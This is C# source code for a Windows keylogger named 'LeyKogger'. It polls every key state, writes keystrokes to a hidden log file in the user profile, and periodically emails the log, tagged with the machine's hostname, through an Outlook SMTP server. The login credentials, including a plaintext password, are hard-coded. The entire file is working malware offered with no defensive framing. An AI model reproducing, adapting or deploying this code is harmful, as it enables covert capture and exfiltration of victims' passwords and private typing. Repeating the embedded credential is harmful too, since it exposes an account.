using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;
using System.Net;
using System.Threading;
using System.Collections.Generic;

namespace LeyKogger
{
    static class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        private static string path = Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\log.txt");
        private static List<Keys> keys = new();

        private static void Initiate()
        {
            if (!File.Exists(path))
            {
                File.Create(path);
                File.SetAttributes(path, FileAttributes.Hidden);
            }
            if (!File.Exists(path + ".archive"))
            {
                File.Create(path + ".archive");
                File.SetAttributes(path + ".archive", FileAttributes.Hidden);
            }
        }

        private static void ReadKeyboard()
        {
            for (short x = 0; x < 256; ++x)
                if (GetAsyncKeyState(x) != 0)
                    keys.Add((Keys)x);
        }

        private static int BytesCount(string path)
        {
            return (File.ReadAllBytes(path)).Length;
        }

        static void Main()
        {
            string buffer = "";
            Initiate();

            while (true)
            {
                ReadKeyboard();
                foreach (Keys key in keys)
                {
                    if (key == Keys.Space) { buffer += " "; continue; }
                    if (key == Keys.Enter) { buffer += "\r\n"; continue; }
                    if (key == Keys.LButton || key == Keys.RButton || key == Keys.MButton) continue;

                    buffer += key.ToString();
                }

                if (buffer.Length > 0)
                    File.AppendAllText(path, buffer);
                buffer = "";
                keys.Clear();
                if (BytesCount(path) > 256 * 1024)
                {
                    buffer += SendMail(path);
                    File.AppendAllText(path + ".archive", File.ReadAllText(path));
                    File.WriteAllText(path, string.Empty);
                }
                Thread.Sleep(100);
            }
        }

        private static string SendMail(string filePath)
        {
            MailMessage message = new MailMessage("marekwork@hotmail.com", "mbarycki@uni.opole.pl");
            message.Subject = "Key log " + DateTime.Now.ToString() + " " + Dns.GetHostName();
            message.Attachments.Add(new Attachment(filePath));
            using (SmtpClient client = new SmtpClient("smtp-mail.outlook.com"))
            {
                client.EnableSsl = true;
                client.Port = 587;
                client.Timeout = 5000;
                client.Credentials = new NetworkCredential("marekwork@hotmail.com", "4love4law");
                try
                {
                    client.Send(message);
                }
                catch (Exception ex)
                {
                    return ex.Message;
                }
                return string.Empty;
            }
        }
    }
}
